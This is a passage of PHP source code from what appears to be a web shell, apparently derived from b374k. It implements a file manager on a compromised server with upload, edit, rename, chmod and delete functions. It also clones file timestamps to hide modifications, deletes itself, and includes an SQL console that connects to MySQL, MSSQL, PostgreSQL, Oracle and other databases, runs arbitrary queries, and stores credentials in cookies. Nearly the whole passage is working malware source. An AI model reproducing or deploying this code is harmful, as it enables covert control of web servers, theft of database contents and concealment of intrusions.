				if (!@file_exists($p['a']) || !@file_exists($p['b'])) 
					sAjax(tText('notexist', 'Object does not exist'));
				else {
					$time = @filemtime($p['b']);
					sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
				}
				break;				
			case 'mpers':
				if (!file_exists($p['a']))
					sAjax(tText('notexist', 'Object does not exist'));
				else
					sAjax(@chmod($p['a'], base_convert($p['b'], 8, 10)) ? 'OK' : tText('fail', 'Fail!'));
				break;	
			case 'ren':
				if (!file_exists($p['a']))
					sAjax(tText('notexist', 'Object does not exist'));
				else
					sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
				break;
		}
	} elseif (@$p['md'] === 'info'){			
		$sBuff .= '<b>' . tText('information', 'Information') . ': </b>
					 <table border=0 cellspacing=1 cellpadding=2>
					 <tr><td><b>' . tText('path', 'Path') . '</b></td><td>' . $p['t'] . '</td></tr>
					 <tr><td><b>' . tText('size', 'Size') . '</b></td><td>' . sizecount(filesize($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('md5', 'MD5') . '</b></td><td>' . strtoupper(@md5_file($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('sha1', 'SHA1') . '</b></td><td>' . strtoupper(@sha1_file($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('ctime', 'Create time') . '</b></td><td>' . date($config['datetime'], filectime($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('atime', 'Access time') . '</b></td><td>' . date($config['datetime'], fileatime($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('mtime', 'Modify time') . '</b></td><td>' . date($config['datetime'], filemtime($p['t'])) . '</td></tr>';
					 
		if (!$isWIN){
			$ow = posix_getpwuid(fileowner($p['t']));
			$gr = posix_getgrgid(filegroup($p['t']));
			$sBuff .= '<tr><td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td><td>' .
						($ow['name'] ? $ow['name'] : fileowner($p['t'])) . '/' . ($gr['name'] ? $gr['name'] : filegroup($p['t'])) .
						'<tr><td><b>' . tText('perms', 'Perms') . '</b></td><td>' . vPermsColor($p['t']) . '</td></tr>';
		}
		$sBuff .= '</table><br>';
				
		$fp  = @fopen($p['t'], 'rb');
		if ($fp){
			$sBuff .= '<div data-path="' . $p['t'] . '"><p>
							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=n&t=\' + euc(dpath(this, false)));">' . tText('hl', 'Highlight') . '</a>]
							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=p&t=\' + euc(dpath(this, false)));">' . tText('hlp', 'Highlight +') . '</a>]
							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=n&t=\' + euc(dpath(this, false)));">' . tText('hd', 'Hexdump') . '</a>]
							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=p&t=\' + euc(dpath(this, false)));">' . tText('hdp', 'Hexdump preview') . '</a>]
							[<a href="#" onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, false)));">' . tText('edit', 'Edit') . '</a>]
						</p></div><br><br>';		
			
			if (isset($p['hd'])){
				if ($p['hd'] === 'n'){
					$sBuff .= '<b>Hex Dump</b><br>';
					$str = fread($fp, filesize($p['t']));
				} else {
					$sBuff .= '<b>Hex Dump Preview</b><br>';
					$str = fread($fp, $config['hd_lines'] * $config['hd_rows']);
				}
				
				$show_offset  = '00000000<br>';
				$show_hex     = '';
				$show_sBuff = '';
				$counter      = 0;
				$str_len      = strlen($str);
				for ($i = 0; $i < $str_len; $i++){
					$counter++;
					$show_hex .= sprintf('%02X', ord($str[$i])) . ' ';
					switch (ord($str[$i])){
						case 0 :
						case 9 :
						case 10:
						case 13:
						case 32: $show_sBuff .= ' '; 
							break;
						default: $show_sBuff .= $str[$i];
					}
					if ($counter === $config['hd_rows']){
						$counter = 0;
						if ($i + 1 < $str_len) 
							$show_offset .= sprintf('%08X', $i + 1) . '<br>';
						$show_hex .= '<br>';
						$show_sBuff .= "\n";
					}
				}
				$sBuff .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . hsc($show_sBuff) . '</pre></td></tr></table></center><br>';
			} else if (isset($p['hl'])){
				if (function_exists('highlight_file')){
					if ($p['hl'] === 'n'){
						$sBuff .= '<b>Highlight sBuff:</b><br>' .
									'<div class=ml1 style="background-color: #e1e1e1; color:black;">' . highlight_file($p['t'], true) . '</div>'; 
					} else {
						$code = substr(highlight_file($p['t'], true), 36, -15);
						$lines = explode('<br>', $code);
						$padLength = strlen(count($lines));
						$sBuff .= '<b>Highlight + sBuff:</b><br><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
						
						foreach($lines as $i => $line){
							$lineNumber = str_pad($i + 1,  $padLength, '0', STR_PAD_LEFT);
							$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', $lineNumber, $line);
						}

						$sBuff .= '</div>';
					}
				} else
					sDialog(tText('hlerror', 'highlight_file() dont exist!'));
			} else {
				$str = @fread($fp, filesize($p['t']));
				$sBuff .= '<b>File sBuff:</b><br>' .
							'<textarea class="bigarea" readonly>' . hsc($str) . '</textarea><br><br>';
			}
		} else
			$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
		
		@fclose($fp);
	} elseif (@$p['md'] === 'edit'){
		if (file_exists($p['t'])){
			$filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($p['t'])));
		
			$sBuff .= '<h2>' . tText('edit', 'Edit') . '</h2>
					<div class="alt1 stdui"><form name="cldate">
						' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdatec') . '
						<h3>' . tText('e1', 'Clone folder/file last modified time') . '</h3>
						' . mInput(array('n'=>'a', 'v'=>$p['t'], 'tt'=>tText('e2', 'Alter folder/file'), 'nl'=>'', 'e'=>'style="width: 99%;" disabled')) . '
						' . mInput(array('n'=>'b', 'tt'=>tText('e3', 'Reference folder/file (fullpath)'), 'nl'=>'', 'e'=>'style="width: 99%;"')) . '
						' . mSubmit(tText('go', 'Go!'), 'uiupdate(0)') . '
					</form></div><br><br>
					<div class="alt1 stdui"><form name="chdate">
						' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdate') . '
						<h3>' . tText('e4', 'Set last modified time') . '</h3>
						' . mInput(array('n'=>'a', 'v'=>$p['t'], 'tt'=>tText('e5', 'Current folder/file (fullpath)'), 'nl'=>'', 'e'=>'style="width: 99%;" disabled')) . '
						<p>
							' . tText('year', 'year') . ': ' . mInput(array('n'=>'y', 'v'=>$filemtime[0], 'e'=>'size="4"')) . '
							' . tText('month', 'month') . ': ' . mInput(array('n'=>'m', 'v'=>$filemtime[1], 'e'=>'size="2"')) . '
							' . tText('day', 'day') . ': ' . mInput(array('n'=>'d', 'v'=>$filemtime[2], 'e'=>'size="2"')) . '
							' . tText('hour', 'hour') . ': ' . mInput(array('n'=>'h', 'v'=>$filemtime[3], 'e'=>'size="2"')) . '
							' . tText('minute', 'minute') . ': ' . mInput(array('n'=>'m', 'v'=>$filemtime[4], 'e'=>'size="2"')) . '
							' . tText('second', 'second') . ': ' . mInput(array('n'=>'s', 'v'=>$filemtime[5], 'e'=>'size="2"')) . '
						</p>
						' . mSubmit(tText('go', 'Go!'), 'uiupdate(1)') . '
					</form></div><br><br>';
					
			$fp = @fopen($p['t'], 'r');
			$buf = @fread($fp, filesize($p['t']));
			@fclose($fp);
			if ($fp)
				$sBuff .= '<div class="alt1 stdui"><form data-path="' . $p['t'] . '">
								' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'edit') . mHide('a', $p['t']) . '
								<h3>' . tText('e5', 'Edit file') . '</h3>
								<p>
									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=n&t=\' + euc(dpath(this, false)));">' . tText('hl', 'Highlight') . '</a>]
									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=p&t=\' + euc(dpath(this, false)));">' . tText('hlp', 'Highlight +') . '</a>]
									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=n&t=\' + euc(dpath(this, false)));">' . tText('hd', 'Hexdump') . '</a>]
									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=p&t=\' + euc(dpath(this, false)));">' . tText('hdp', 'Hexdump preview') . '</a>]
								</p><br>
								<textarea name="fc" cols="100" rows="25" style="width: 99%;">' . hsc($buf) . '</textarea>
								' . mSubmit(tText('go', 'Go!'), 'uiupdate(2)') . '
							</form></div><br><br>';
		}
	} else {
		if (isset($p['ac']) && $p['ac'] === 'up')
			sDialog(@copy($_FILES['upf']['tmp_name'], $p['dir'] . DS . $_FILES['upf']['name']) ? tText('upload', 'Upload') . ' ' . tText('ok', 'Ok!') : tText('fail', 'Fail!'));
				
        // Obtenemos el directorio en el que estamos
		$currentdir = $shelldir;
        if (!empty($p['dir'])){
			$p['dir'] = str_replace(array('/', '\\'), DS, $p['dir']);
			if (substr($p['dir'], -1) !== DS) $p['dir'] = $p['dir'] . DS;
			$currentdir = $p['dir'];
		}

        $sBuff .= '<form><table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';

        $free = @disk_free_space($currentdir);
        $all = @disk_total_space($currentdir);
        if ($free) $sBuff .= '<h2>' . tText('freespace', 'Free space') . ' ' . sizecount($free) . ' ' . tText('of', 'of') . ' ' . sizecount($all) . ' (' . round(100 / ($all / $free), 2) . '%)</h2>';
		
		$fp = '';
		$lnks = '';
		foreach (explode(DS, $currentdir) as $tmp){
			if (!empty($tmp) || empty($fp)){
				$fp .= $tmp . DS;
				$lnks .= '<a href="#" data-path="' . $fp .'" onclick="godisk(this);return false;" >' . $tmp . DS . '</a> ';
			}
		}
		unset($fp, $tmp);

		$sBuff .= '<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
			  <tr>
					<td nowrap>' . tText('acdir', 'Current directory') . ' [' . (@is_writable($currentdir) ? tText('writable', 'Writable') : tText('no', 'No') . ' ' . tText('writable', 'Writable')) . ($isWIN ? '' : ', ' . getChmod($currentdir)) . ']: </td>
					<td width="100%"><span id="sgoui" class="hide"><div class="image dir" onclick="change(\'sgoui\', \'lnks\')"></div>&nbsp;
					&nbsp;<input id="goui" name="goui" value="' . $currentdir . '" type="text" size="100%">
					&nbsp;' . mSubmit(tText('go', 'Go!'), 'godirui()') . '</span><span id="lnks"><div class="image edit" onclick="change(\'lnks\', \'sgoui\')"></div>&nbsp;'. $lnks .'</span></td>
			  </tr>
			</table>		
			<tr class="alt1"><td colspan="7" style="padding:5px;">';

        if ($isWIN){
			$sBuff .= tText('drive', 'Drive') . ': ';
			if (class_exists('COM')){
				$obj = new COM('scripting.filesystemobject');
				if ($obj && is_object($obj)){
					$DriveTypeDB = array(0 => tText('unknow', 'Unknow'),
						1 => tText('removable', 'Removable'),
						2 => tText('fixed', 'Fixed'),
						3 => tText('network', 'Network'),
						4 => tText('cdrom', 'CDRom'),
						5 => tText('ramdisk', 'RAM Disk'));
						
					foreach ($obj->Drives as $drive){
						$sBuff .= ' [<a href="#" data-path="' . $drive->Path . '/\'" onclick=';
						if ($drive->DriveType == 2) 
							$sBuff .= '"godisk(this);return false;" title="' . tText('size', 'Size') . ':' . sizecount($drive->TotalSize) . ' ' . tText('free', 'Free') . ':' . sizecount($drive->FreeSpace) . ' ' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>] ';
						else 
							$sBuff .= '"if (confirm(\'' . tText('derror', 'Make sure that disk is avarible, otherwise an error may occur.') . '\')) godisk(this);return false;" title="' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>]';
					}
				}
            } else {
				foreach (range('A', 'Z') as $letter){
					if (@is_readable($letter . ':\\')) $sBuff .= ' [<a href="#" data-path="' . $letter . ':\\" onclick="godisk(this);return false;" >' . $letter . ':</a>] ';
				}
			}
			$sBuff .= '<br>';
        }

        $sBuff .= '
		<a href="#" data-path="' .$_SERVER['DOCUMENT_ROOT'] . '" onclick="godisk(this, false);return false;">' . tText('webroot', 'WebRoot') . '</a> | 
		<!-- <a href="#" onclick="ajaxLoad(\'dir=' . $shelldir . '/&view_writable=dir\');">' . tText('vwdir', 'View writable directories') . '</a> | 
		<a href="#" onclick="ajaxLoad(\'dir=' . $shelldir . '/&view_writable=file\');">' . tText('vwfils', 'View writable files') . '</a> | -->
		<a href="#" onclick="showUI(\'cdir\', this);return false;">' . tText('createdir', 'Create directory') . '</a> | 
		<a href="#" onclick="showUI(\'cfile\', this);return false;">' . tText('createfile', 'Create file') . '</a> | 
		<a href="#" onclick="up();return false;">' . tText('upload', 'Upload') . '</a>
		</td></tr></table>
		<br>';

        $dirdata = $filedata = array();
		
		if (@$p['view_writable'] === 'dir'){
			$dirdata = GetWDirList($currentdir);
		} elseif (@$p['view_writable'] === 'file'){
			$filedata = GetWFileList($currentdir);
		} elseif (@sValid($p['findstr'])){
			$filedata = GetSFileList($currentdir, $p['findstr'], $p['re']);
		} else {
            if (is_dir($currentdir)){
				if ($res = opendir($currentdir)){
					$c = 0;
					$start = False;
					$show = True;
					
					if ($config['FMLimit'] && isset($p['pg'])){
						$start = ($p['pg'] > 1 ? $config['FMLimit'] * ($p['pg'] - 1) : $config['FMLimit']);
						$config['FMLimit'] = $config['FMLimit'] * $p['pg'];
					}

					while ($file = readdir($res)){
						if ($config['FMLimit'])	{
							if ($start) 
								if ($c == $start) 
									$start = True;
							if ($c == $config['FMLimit']) 
								break;  
						}
						if ($show){
							if (is_dir($currentdir . $file)){
								if ($file !== '.' && $file !== '..'){
									$c++;
									$dirdata[] = $file;
								}
							} else if (is_file($currentdir . $file)){
								$c++;
								$filedata[] = $file;
							} //TODO syslinks
						} 
					}
					
					closedir($res);
					natcasesort($dirdata);
					natcasesort($filedata);
				}
            } else
				$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
        }
		
		$sBuff .= '<table id="sort" class="explore sortable">
			<thead><tr data-path="' . getUpPath($currentdir) . '" class="alt1">
			<td class="alt1 sorttable_nosort"><a href="#" onclick="godir(this, false);return false;"><div class="image lnk"></div></a></td>
			<td width="70%"><b>' . tText('name', 'Name') . '</b></td>
			<td><b>' . tText('date', 'Date') . '</b></td>
			<td><b>' . tText('size', 'Size') . '</b></td>
			' . (! $isWIN ? '<td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td>' : '') . '
			<td width="120px"><b>' . tText('actions', 'Actions') . '</b></td>
			</tr></thead>
			<tbody>';
					
			$d = 0;
			$bg = 2;
			foreach ($dirdata as $file){
                $sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
					<td><input type="checkbox" value="' . $file . DS . '" name="dl[]"></td>
					<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file . '</a></td>
					<td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
					<td><a href="#" onclick="viewSize(this);return false;">[?]</a></td>
					' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this)";return false;>' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . 
					'</td>' : '') . '
					<td>
					<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
					<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
					<div onclick="ajaxLoad(\'me=file&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
					<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
					</td>
					</tr>';
				$d++;
            }

			//$_SERVER['DOCUMENT_ROOT']
			//uso esa variable para saber si corresponde o no el link al archivo
			
            foreach ($filedata as $file){
                $sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
					<td width="2%"><input type="checkbox" value="' . $file . '" name="dl[]"></td><td>';

                //mark shell name in yellow
                if ($currentdir . $file === __file__) $sBuff .= '<div class="image php"></div><font class="my">' . $file . '</font>';
                else $sBuff .= showIcon($file) . ' <a href="' . str_replace(SROOT, '', $file) . '" target="_blank">' . $file . '</a>';

                $sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
							<td>' . sizecount(filesize64($currentdir . $file)) . '</td>
							' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . 
							'</td>' : '') . '
							<td>
							<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
							<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
							<div onclick="ajaxLoad(\'me=file&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
							<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
							<div onclick="dl(this);return false;" class="image download"></div>
							</td></tr>';
            }

            $sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
					<td width="2%">
					<input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" />
					</td>
					<td>
					' . tText('selected', 'Selected')  . ': 
					<a href="#" onclick="showUISec(\'comp\', this);return false;">' . tText('download', 'Download')  . '</a> | 
					<a href="#" onclick="showUISec(\'rdel\', this);return false;">' . tText('del', 'Del') . '</a> | 
					<a href="#" onclick="showUISec(\'copy\', this);return false;">' . tText('copy', 'Copy') . '</a>
					</td>
					<td colspan="4" align="right">
					<b>' . $d . '</b> ' . tText('dirs', 'Directories')  . ' / <b>' . ($c - $d) . '</b> ' . tText('fils', 'Files') . '
					</td>
					</tr></tfoot>
					</table></form>' . mHide('base', $currentdir);
        }
}

if (isset($p['me']) && $p['me'] === 'phpinfo'){
    if (function_exists('phpinfo') && @!in_array('phpinfo', $dis_func)){
        phpinfo();
        exit;
    } else
        $sBuff = sDialog(tText('phpinfoerror', 'phpinfo() function has non-permissible'));
}

if (isset($p['me']) && $p['me'] === 'srm'){
    if ((isset($p['uc'])) && ($p['uc'] === $p['rc'])){
        if (unlink(__file__)){
            @ob_clean();
			exit('Bye ;(');
        } else
            $sBuff .= '<b>' . tText('fail', 'Fail!') . '</b><br>';
    }
	$r = mt_rand(1337, 9999);
	$sBuff .= '<form><b>' . tText('del', 'Del') . ': ' . __file__ . '<br><br>' . tText('reminfo', 'For confirmation enter this code') . ': ' . $r . '</b> 
			' . mHide('me', 'srm') . mHide('rc', $r) . '
			<input type="text" name="uc">&nbsp;&nbsp;&nbsp;<input type="button" value="' . tText('go', 'Go!') . '" onclick="ajaxLoad(serialize(d.forms[0]));return false;" />
			</form>';
}

if (isset($p['me']) && $p['me'] === 'sql'){
	# SQL
	//based on b374k by DSR!
	function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){
		if ($sqltype === 'mysql'){
			$hosts = explode(':', $sqlhost);
			if(count($hosts)==2) $host_str = $hosts[0].':'.$hosts[1];
			else $host_str = $sqlhost;
			if(function_exists('mysqli_connect')) return @mysqli_connect($host_str, $sqluser, $sqlpass);
			elseif(function_exists('mysql_connect')) return @mysql_connect($host_str, $sqluser, $sqlpass);
		} elseif($sqltype === 'mssql'){
			if(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass);
			elseif(function_exists('sqlsrv_connect')){
				$coninfo = array('UID'=>$sqluser, 'PWD'=>$sqlpass);
				return @sqlsrv_connect($sqlhost,$coninfo);
			}
		} elseif($sqltype === 'pgsql'){
			$hosts = explode(':', $sqlhost);
			if(count($hosts)==2) $host_str = 'host='.$hosts[0].' port='.$hosts[1];
			else $host_str = 'host='.$sqlhost;
			if(function_exists('pg_connect')) return @pg_connect($host_str.' user='.$sqluser.' password='.$sqlpass);
		} elseif($sqltype === 'oracle'){ 
			if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); 
		} elseif($sqltype === 'sqlite3'){
			if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost);
		} elseif($sqltype === 'sqlite'){ 
			if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); 
		} elseif($sqltype === 'odbc'){ 
			if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass);
		} elseif($sqltype === 'pdo'){
			if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass);
		}
		return false;
	}

	function sql_query($sqltype, $query, $con){
		if ($sqltype === 'mysql'){
			if(function_exists('mysqli_query')) return mysqli_query($con,$query);
			elseif(function_exists('mysql_query')) return mysql_query($query);
		} elseif($sqltype === 'mssql'){
			if(function_exists('mssql_query')) return mssql_query($query);
			elseif(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
		} elseif($sqltype === 'pgsql') return pg_query($query);
		elseif($sqltype === 'oracle') return oci_execute(oci_parse($con, $query));
		elseif($sqltype === 'sqlite3') return $con->query($query);
		elseif($sqltype === 'sqlite') return sqlite_query($con, $query);
		elseif($sqltype === 'odbc') return odbc_exec($con, $query);
		elseif($sqltype === 'pdo') return $con->query($query);
	}

	function sql_num_fields($sqltype, $result, $con){
		if ($sqltype === 'mysql'){
			if(function_exists('mysqli_field_count')) return mysqli_field_count($con);
			elseif (function_exists('mysql_num_fields')) return mysql_num_fields($result);
		} elseif($sqltype === 'mssql'){
			if(function_exists('mssql_num_fields')) return mssql_num_fields($result);
			elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result);
		} elseif($sqltype === 'pgsql') return pg_num_fields($result);
		elseif($sqltype === 'oracle') return oci_num_fields($result);
		elseif($sqltype === 'sqlite3') return $result->numColumns();
		elseif($sqltype === 'sqlite') return sqlite_num_fields($result);
		elseif($sqltype === 'odbc') return odbc_num_fields($result);
		elseif($sqltype === 'pdo') return $result->columnCount();
	}

	function sql_field_name($sqltype,$result,$i){
		if ($sqltype === 'mysql'){
			if(function_exists('mysqli_fetch_fields')){
				$metadata = mysqli_fetch_fields($result);
				if(is_array($metadata)) return $metadata[$i]->name;
			} elseif (function_exists('mysql_field_name')) return mysql_field_name($result,$i);
		} elseif($sqltype === 'mssql'){
			if(function_exists('mssql_field_name')) return mssql_field_name($result,$i);
			elseif(function_exists('sqlsrv_field_metadata')){
				$metadata = sqlsrv_field_metadata($result);
				if(is_array($metadata)) return $metadata[$i]['Name'];
			}
		} elseif($sqltype === 'pgsql') return pg_field_name($result,$i);
		elseif($sqltype === 'oracle') return oci_field_name($result,$i+1);
		elseif($sqltype === 'sqlite3') return $result->columnName($i);
		elseif($sqltype === 'sqlite') return sqlite_field_name($result,$i);
		elseif($sqltype === 'odbc') return odbc_field_name($result,$i+1);
		elseif($sqltype === 'pdo'){
			$res = $result->getColumnMeta($i);
			return $res['name'];
		}
	}

	function sql_fetch_data($sqltype,$result){
		if ($sqltype === 'mysql'){
			if(function_exists('mysqli_fetch_row')) return mysqli_fetch_row($result);
			elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
		} elseif($sqltype === 'mssql'){
			if(function_exists('mssql_fetch_row')) return mssql_fetch_row($result);
			elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1);
		} elseif($sqltype === 'pgsql') return pg_fetch_row($result);
		elseif($sqltype === 'oracle') return oci_fetch_row($result);
		elseif($sqltype === 'sqlite3') return $result->fetchArray(1);
		elseif($sqltype === 'sqlite') return sqlite_fetch_array($result,1);
		elseif($sqltype === 'odbc') return odbc_fetch_array($result);
		elseif($sqltype === 'pdo') return $result->fetch(2);
	}

	function sql_num_rows($sqltype,$result){
		if ($sqltype === 'mysql'){
			if(function_exists('mysqli_num_rows')) return mysqli_num_rows($result);
			elseif(function_exists('mysql_num_rows')) return mysql_num_rows($result);
		} elseif($sqltype === 'mssql'){
			if(function_exists('mssql_num_rows')) return mssql_num_rows($result);
			elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result);
		} elseif($sqltype === 'pgsql') return pg_num_rows($result);
		elseif($sqltype === 'oracle') return oci_num_rows($result);
		elseif($sqltype === 'sqlite3'){
			$metadata = $result->fetchArray();
			if(is_array($metadata)) return $metadata['count'];
		} elseif($sqltype === 'sqlite') return sqlite_num_rows($result);
		elseif($sqltype === 'odbc') return odbc_num_rows($result);
		elseif($sqltype === 'pdo') return $result->rowCount();
	}

	function sql_close($sqltype,$con){
		if ($sqltype === 'mysql'){
			if(function_exists('mysqli_close')) return mysqli_close($con);
			elseif(function_exists('mysql_close')) return mysql_close($con);
		} elseif($sqltype === 'mssql'){
			if(function_exists('mssql_close')) return mssql_close($con);
			elseif(function_exists('sqlsrv_close')) return sqlsrv_close($con);
		} elseif($sqltype === 'pgsql') return pg_close($con);
		elseif($sqltype === 'oracle') return oci_close($con);
		elseif($sqltype === 'sqlite3') return $con->close();
		elseif($sqltype === 'sqlite') return sqlite_close($con);
		elseif($sqltype === 'odbc') return odbc_close($con);
		elseif($sqltype === 'pdo') return $con = null;
	}
	 
	/*
		function dump($table){
			if (empty($table)) return 0;
			$this->dump = array();
			$this->dump[0] = '';
			$this->dump[1] = '-- --------------------------------------- ';
			$this->dump[2] = '--  Created: ' . date("d/m/Y H:i:s");
			$this->dump[3] = '--  Database: ' . $this->base;
			$this->dump[4] = '--  Table: ' . $table;
			$this->dump[5] = '-- --------------------------------------- ';

			switch ($this->db){
				case 'MySQL':
					$this->dump[0] = '-- MySQL dump';
					if ($this->query('SHOW CREATE TABLE `' . $table . '`') != 1) return 0;
					if (! $this->get_result()) return 0;
					$this->dump[] = $this->rows[0]['Create Table'];
					$this->dump[] = '-- ------------------------------------- ';
					if ($this->query('SELECT * FROM `' . $table . '`') != 1) return 0;
					if (! $this->get_result()) return 0;
					for ($i = 0; $i < $this->num_rows; $i++){
						foreach ($this->rows[$i] as $k => $v){
							$this->rows[$i][$k] = @mysql_real_escape_string($v);
						}
						$this->dump[] = 'INSERT INTO `' . $table . '` (`' . @implode("`, `", $this->columns) . '`) VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
					}
					break;
				case 'MSSQL':
					$this->dump[0] = '## MSSQL dump';
					if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
					if (! $this->get_result()) return 0;
					for ($i = 0; $i < $this->num_rows; $i++){
						foreach ($this->rows[$i] as $k => $v){
							$this->rows[$i][$k] = @addslashes($v);
						}
						$this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
					}
					break;
				case 'PostgreSQL':
					$this->dump[0] = '## PostgreSQL dump';
					if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
					if (! $this->get_result()) return 0;
					for ($i = 0; $i < $this->num_rows; $i++){
						foreach ($this->rows[$i] as $k => $v){
							$this->rows[$i][$k] = @addslashes($v);
						}
						$this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
					}
					break;
				case 'Oracle':
					$this->dump[0] = '## ORACLE dump';
					$this->dump[] = '## under construction';
					break;
				default:
					return 0;
					break;
			}

			return 1;
		}
	*/


	$login = 604800; //3600 * 24 * 7;

	if (isset($p['sqlcode'])){
		$sBuff = '';
		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
		foreach(explode(';', $p['sqlcode']) as $query){
			if (trim($query) !== ''){
				$res = sql_query($p['sqltype'],$query,$con);
				if ($res !== false){
					$sBuff .= '<hr /><p style="padding:0;margin:6px 10px;font-weight:bold;">' . hsc($query) . ';&nbsp;&nbsp;<span>[ ok ]</span></p>';

					if (!is_bool($res)){
						$sBuff .= '<table id="sort" class="explore sortable" style="width:100%;"><tr>';
						for ($i = 0; $i<sql_num_fields($p['sqltype'], $res, $con); $i++)
							$sBuff .= '<th>' . @hsc(sql_field_name($p['sqltype'], $res, $i)) . '</th>';
						$sBuff .= '</tr>';
						while($rows=sql_fetch_data($p['sqltype'], $res)){
							$sBuff .= '<tr>';
							foreach($rows as $r){
								//if ($r === '') $r = ' ';
								$sBuff .= '<td>' . @hsc($r) . '</td>';
							}
							$sBuff .= '</tr>';
						}
						$sBuff .= '</table>';
					}
				} else
					$sBuff .= '<p style="padding:0;margin:6px 10px;font-weight:bold;">' . hsc($query) . ';&nbsp;&nbsp;&nbsp;<span>[ error ]</span></p>';
			}
		}
		
		sAjax($sBuff);
	} elseif (isset($p['sqlhost'])){
		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
		if ($con !== false){
			if(isset($p['sqlinit'])){
				$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
				while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($c_num, $_COOKIE['c']))
					$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
				setcookie('c[' . $c_num . ']', ((function_exists('json_encode') && function_exists('json_decode')) ? json_encode($p) : serialize($p)), time() + $login);
			}
			
			$sBuff .= '<form>' .
				mHide('me', 'sql') . mHide('sqltype', $p['sqltype']) . 
				mHide('sqlhost', $p['sqlhost']) . mHide('sqlport', $p['sqlport']) . 
				mHide('sqluser', $p['sqluser']) . mHide('sqlpass', $p['sqlpass']) . '
